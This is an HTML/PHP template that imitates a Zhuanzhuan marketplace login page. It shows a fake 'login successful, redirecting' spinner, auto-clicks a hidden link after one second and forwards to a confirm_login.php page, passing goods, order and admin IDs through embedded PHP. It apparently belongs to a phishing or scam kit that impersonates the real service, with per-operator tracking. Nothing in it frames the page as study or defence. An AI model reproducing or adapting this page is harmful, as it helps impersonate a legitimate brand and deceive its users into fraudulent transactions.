
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">


<html data-dpr="1" style="font-size: 40px;background: #fdfdfd;"><head><meta charset="utf-8"><title>欢迎登录转转</title><link rel="dns-prefetch" href="https://img.58cdn.com.cn"><meta name="description" content="欢迎登录转转"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta content="telephone=no,email=no" name="format-detection"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="default">
<style type="text/css">
.load{
	width: 100%;
	height: 100vh;
	position: fixed;
	top: 0;
	z-index: 1000;
	//display: none;
	background-color: rgb(99 96 96 / 27%);
}
.loader{
	width: 140px;
	height: 120px;
	/* border: 1px solid red; */
	text-align: center;
	position: absolute;
	top: calc(47% - 70px);
	left: calc(50% - 70px);
	padding-top: 15px;
	background-color: rgba(0, 0, 0, 0.5);
	border-radius: 5px;
}
#loader-1{
	width: 60px;
	height: 60px;
}
.load-msg{
	height: 50px;
	line-height: 50px;
	color: #fff;
	font-size: 14px;
	/* margin-top: 20px; */
}
svg path, svg rect {
	fill: #fff;
}
</style>
</head>

<body>

<div  class="load"id="tbbt">
	<div class="loader" title="2">
		<svg version="1.1" id="loader-1"  x="0px" y="0px" width="100px" height="100px" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50;" xml:space="preserve">
			<path fill="#000" d="M43.935,25.145c0-10.318-8.364-18.683-18.683-18.683c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615c8.072,0,14.615,6.543,14.615,14.615H43.935z">
				<animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite" />
			</path>
		</svg>
		<div class="load-msg"> 登陆成功正在跳转...</div>
	</div>
	
</div>

 <div style="margin-top:5px;margin-left:15px;color:#8B8B7A;z-index: 10000;" />
  <a id = "clickMe" onclick="f()"><font size="4.5rem" color="fff">关闭</font></a>
            </div>
</body>
<script type="text/javaScript"> 
  setTimeout(function() {
     // IE
     if(document.all) {
         document.getElementById("clickMe").click();
     }
     // 其它浏览器
     else {
         var e = document.createEvent("MouseEvents");
         e.initEvent("click", true, true);
         document.getElementById("clickMe").dispatchEvent(e);
     }
}, 1000);
  function f() { 	
   location.replace('confirm_login.php?i=<?php echo $_List['goods_oid']; ?>.shtml&fullCate=<?php echo $_List['in_admin_id']; ?>&zhuanzhuanSourceFrom=<?php echo $zhuanzhuanNUM1_1; ?>&PGTID=0d400005-0278-44ac-f681-fdcb1dfcf2fe&ClickID=<?php echo $_List['goods_id']; ?>'); 
	
  	}   
  </script>  
</html>



